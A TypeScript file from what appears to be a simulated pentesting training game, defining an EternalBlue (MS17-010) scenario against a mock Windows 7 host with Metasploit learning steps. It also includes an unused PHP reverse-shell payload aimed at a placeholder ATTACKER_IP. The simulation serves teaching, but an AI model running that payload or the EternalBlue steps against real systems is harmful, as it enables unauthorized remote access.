// ── exercises/exercise03.ts ───────────────────────────────────────
// Scenario 3 — EternalBlue / MS17-010 Windows 7
// Datos y configuración específicos para este escenario

import { assignDHCP } from '../utils/network';
import type { Machine, Scenario, MachineInfo, Port, LearningStep, Mission, FileEntry } from '../types';

// MACs únicas para máquinas atacantes (evita colisiones entre escenarios)
const ATTACKER_MACS = ['08:00:27:AA:BB:CC', '08:00:27:AA:BB:CD', '08:00:27:AA:BB:CE'];
let attackerCount = 0;

// Resetea el contador de MACs al cambiar de escenario
export function resetAttackerCounter() { attackerCount = 0; }

export function createAttackerMachine(networkRange: string, customHostname?: string): Machine {
  const mac = ATTACKER_MACS[attackerCount % ATTACKER_MACS.length];
  attackerCount++;
  return {
    id: 'attacker-01',
    machine_info: { hostname: customHostname || 'kali-attacker', ip: '', mac, os: 'Kali Linux 2023.4', status: 'up', type: 'workstation' },
    discovery_level: 4, scan_results: { ports: [] }, web_enumeration: { web_server: 'none', cms: 'none', directories: [] },
    learning_steps: [], files: [],
  };
}

interface ScenarioBuilderConfig {
  id: string; name: string; description: string;
  difficulty: 'Easy' | 'Medium' | 'Hard';
  category: 'Web' | 'Network' | 'Crypto' | 'Forensics';
  networkRange: string; attackerFiles?: FileEntry[];
  targetMachine: Omit<Machine, 'machine_info' | 'id'> & { id: string; machine_info: Omit<MachineInfo, 'ip'>; ports: Port[] };
  learningSteps: LearningStep[];
}

export function buildScenario(config: ScenarioBuilderConfig): Scenario {
  const attacker = createAttackerMachine(config.networkRange);
  if (config.attackerFiles?.length) attacker.files = config.attackerFiles;
  const target: Machine = {
    ...config.targetMachine,
    machine_info: { ...config.targetMachine.machine_info, ip: '' } as MachineInfo,
    scan_results: { ports: config.targetMachine.ports },
    web_enumeration: config.targetMachine.web_enumeration || { web_server: 'none', cms: 'none', directories: [] },
    discovery_level: 0,
    learning_steps: config.learningSteps.map((step, idx) => ({ ...step, id: idx + 1 })),
    files: config.targetMachine.files || [],
  };
  const machines = assignDHCP(config.networkRange, [attacker, target]);
  const missions: Mission[] = config.learningSteps.map((step, idx) => ({
    id: idx + 1, title: step.task, description: step.text,
    status: idx === 0 ? 'active' : 'pending', targetMachineId: config.targetMachine.id, discoveryLevel: step.discoveryLevel,
  }));
  return {
    id: config.id, name: config.name, description: config.description,
    difficulty: config.difficulty, category: config.category, network_range: config.networkRange,
    initialMachineId: 'attacker-01', machines, missions,
  };
}

export const COMMON_PORTS = {
  ssh: (version = 'OpenSSH 8.2p1 Ubuntu', creds?: { user: string; pass: string }): Port => ({ port: 22, protocol: 'tcp', state: 'open', service: 'ssh', version, credentials: creds }),
  http: (version = 'Apache httpd 2.4.41'): Port => ({ port: 80, protocol: 'tcp', state: 'open', service: 'http', version }),
  https: (version = 'nginx'): Port => ({ port: 443, protocol: 'tcp', state: 'open', service: 'https', version }),
  mysql: (state: 'open' | 'filtered' | 'closed' = 'filtered'): Port => ({ port: 3306, protocol: 'tcp', state, service: 'mysql', version: state === 'open' ? 'MySQL 5.7.38' : 'unknown' }),
  smb: (version = 'Windows 7 Professional 7601'): Port => ({ port: 445, protocol: 'tcp', state: 'open', service: 'microsoft-ds', version }),
  rdp: (): Port => ({ port: 3389, protocol: 'tcp', state: 'open', service: 'ms-wbt-server', version: 'Microsoft Terminal Services' }),
};

export function createWebDirs(paths: Array<{ path: string; status: 200 | 301 | 403 | 404; description: string }>) {
  return paths.map(p => ({ path: p.path, status: p.status, description: p.description }));
}

export function createFile(path: string, content: string, type: 'text' | 'hash' | 'binary' = 'text') {
  return { path, content, type };
}

const REVERSE_SHELL_PAYLOAD = {
  phpSimple: `<?php\n\$ip = "ATTACKER_IP"; \$port = LISTENER_PORT;\n\$sock = fsockopen(\$ip, \$port);\nif(\$sock === false) { echo "No connection"; exit(); }\n\$proc = proc_open('/bin/bash', array(0=>\$sock,1=>\$sock,2=>\$sock), \$pipes);\n?>`,
};

export interface LinuxFileSystemConfig { username?: string; password?: string; shadowPassword?: string; }

export function createLinuxFileSystem(config: LinuxFileSystemConfig = {}) {
  const u = config.username || 'www-data';
  const sp = config.shadowPassword || '$6$rounds=656000$abcdefghijklmnop$1234567890abcdefghijklmnop/1234567890123456';
  return [
    createFile('/etc/passwd', `root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nadmin:x:1000:1000:admin,,,:/home/admin:/bin/bash\n${u}:x:1001:1001:${u},,,:/home/${u}:/bin/bash`, 'text'),
    createFile('/etc/shadow', `root:${sp}:18000:0:99999:7:::\ndaemon:*:18000:0:99999:7:::\nwww-data:*:18000:0:99999:7:::`, 'text'),
    createFile('/etc/hostname', 'target-server', 'text'),
    createFile('/etc/os-release', 'NAME="Ubuntu"\nVERSION="20.04.5 LTS"\nID=ubuntu\nPRETTY_NAME="Ubuntu 20.04.5 LTS"\nVERSION_ID=20.04', 'text'),
    createFile('/var/www/html/index.html', '<!DOCTYPE html>\n<html><head><title>Web Server</title></head>\n<body><h1>Welcome to Apache2 Ubuntu Default Page</h1></body></html>', 'text'),
    createFile('/var/www/html/.htaccess', '# AuthType Basic\n# AuthName "Restricted Area"\n# AuthUserFile /var/www/html/.htpasswd', 'text'),
    createFile('/home/admin/.bashrc', 'export PATH="$HOME/bin:$PATH"\nalias ll="ls -l"\nalias la="ls -la"', 'text'),
    createFile('/home/admin/.bash_history', 'ls -la\npwd\ncat /etc/passwd\nsudo su\nwhoami', 'text'),
    createFile('/root/.bashrc', 'export PATH="/root/bin:$PATH"\nalias ll="ls -l"', 'text'),
    createFile('/var/log/auth.log', 'Mar 19 10:23:45 target-server sshd[1234]: Accepted password for admin from 192.168.1.100 port 54321 ssh2\nMar 19 10:24:12 target-server sudo: admin : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash', 'text'),
    createFile('/etc/apache2/apache2.conf', '# ServerAdmin webmaster@localhost\n# DocumentRoot /var/www/html\n# <Directory /var/www/html>\n#   Options Indexes FollowSymLinks\n#   AllowOverride All\n# </Directory>', 'text'),
  ];
}

// Datos específicos para el escenario EternalBlue
const scenario03Data = {
  id: 'scenario-03',
  name: 'EternalBlue — MS17-010',
  networkRange: '172.16.0.0/24',
  flags: {
    root: 'THM{ETERNALBLUE_SYSTEM_PWNED}',
  },
  targetMachine: {
    id: 'win7-target',
    hostname: 'WIN7-TARGET',
    mac: '08:00:27:C4:D5:E6',
    os: 'Windows 7 Professional SP1 x64',
    type: 'workstation',
    ports: [
      { port: 135, protocol: 'tcp', state: 'open', service: 'msrpc', version: 'Microsoft Windows RPC' },
      { port: 139, protocol: 'tcp', state: 'open', service: 'netbios-ssn', version: 'Microsoft Windows netbios-ssn' },
      { port: 445, protocol: 'tcp', state: 'open', service: 'microsoft-ds', version: 'Windows 7 Professional 7601 Service Pack 1' },
      { port: 49152, protocol: 'tcp', state: 'open', service: 'msrpc', version: 'Microsoft Windows RPC' },
    ],
    webServer: 'none',
    cms: 'none',
    directories: [],
    files: [
      { path: 'C:\\\\Users\\\\Administrator\\\\Desktop\\\\flag.txt', content: 'THM{ETERNALBLUE_SYSTEM_PWNED}', type: 'text' },
      { path: 'C:\\\\Windows\\\\System32\\\\config\\\\SAM', content: '[SAM Database — use hashdump]', type: 'binary' },
    ],
  },
  learningSteps: [
    { id: 1, task: 'Reconocimiento de red', text: 'Descubrir hosts: arp-scan <network/cidr>', discoveryLevel: 1 },
    { id: 2, task: 'Escaneo de puertos', text: 'Identificar servicios: nmap -sV <target-ip>', discoveryLevel: 2 },
    { id: 3, task: 'Verificar vulnerabilidad', text: 'msfconsole: use auxiliary/scanner/smb/smb_ms17_010 → set RHOSTS → run', discoveryLevel: 2 },
    { id: 4, task: 'Explotar EternalBlue', text: 'use exploit/windows/smb/ms17_010_eternalblue → set RHOSTS/LHOST → exploit', discoveryLevel: 3 },
    { id: 5, task: 'Verificar acceso SYSTEM', text: 'meterpreter: getuid', discoveryLevel: 4 },
  ],
};

// Template específico para EternalBlue
export const SCENARIO_TEMPLATES = {
  eternalBlue: (): ScenarioBuilderConfig => ({
    id: scenario03Data.id,
    name: scenario03Data.name,
    description: 'Explotación EternalBlue en Windows 7 sin parchear mediante Metasploit.',
    difficulty: 'Medium',
    category: 'Network',
    networkRange: scenario03Data.networkRange,
    targetMachine: {
      id: scenario03Data.targetMachine.id,
      machine_info: {
        hostname: scenario03Data.targetMachine.hostname,
        mac: scenario03Data.targetMachine.mac,
        os: scenario03Data.targetMachine.os,
        status: 'up',
        type: scenario03Data.targetMachine.type,
      },
      discovery_level: 0,
      scan_results: { ports: [] },
      learning_steps: [],
      ports: scenario03Data.targetMachine.ports,
      web_enumeration: {
        web_server: scenario03Data.targetMachine.webServer,
        cms: scenario03Data.targetMachine.cms,
        directories: scenario03Data.targetMachine.directories,
      },
      files: [
        createFile('C:\\\\Users\\\\Administrator\\\\Desktop\\\\flag.txt', scenario03Data.flags.root),
        createFile('C:\\\\Windows\\\\System32\\\\config\\\\SAM', '[SAM Database — use hashdump]', 'binary'),
      ],
    },
    learningSteps: scenario03Data.learningSteps.map((step, idx) => ({
      ...step,
      id: idx + 1,
      targetMachineId: scenario03Data.targetMachine.id,
    })),
  }),
};

export const scenario_03: Scenario = buildScenario(SCENARIO_TEMPLATES.eternalBlue());
